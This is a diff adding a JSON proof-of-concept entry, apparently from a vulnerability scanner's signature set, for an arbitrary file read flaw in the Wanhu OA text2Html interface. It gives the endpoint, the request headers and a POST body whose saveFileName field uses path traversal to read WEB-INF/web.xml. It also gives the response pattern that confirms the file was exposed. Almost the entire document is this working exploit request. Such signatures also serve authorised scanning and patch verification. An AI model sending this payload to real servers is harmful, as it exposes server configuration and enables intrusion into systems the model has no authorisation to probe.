@@ -1,0 +1,19 @@
+{
+	"name":"万户OAtext2Html接口任意文件读取",
+	"tag":"wanhu",
+	"type":"other",
+	"poc":{
+		"pocGet":"/defaultroot/convertFile/text2Html.controller",
+		"pocPost":"saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html",
+		"header":{
+			"SL-CE-SUID":" 1081",
+			"User-Agent":" Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
+			"Connection":" close",
+			"Accept-Encoding":" gzip, deflate, br",
+			"Content-Length":" 63",
+			"Content-Type":" application/x-www-form-urlencoded"
+		},
+		"status_code":"200",
+		"pattern":"(filter-name)"
+	}
+}
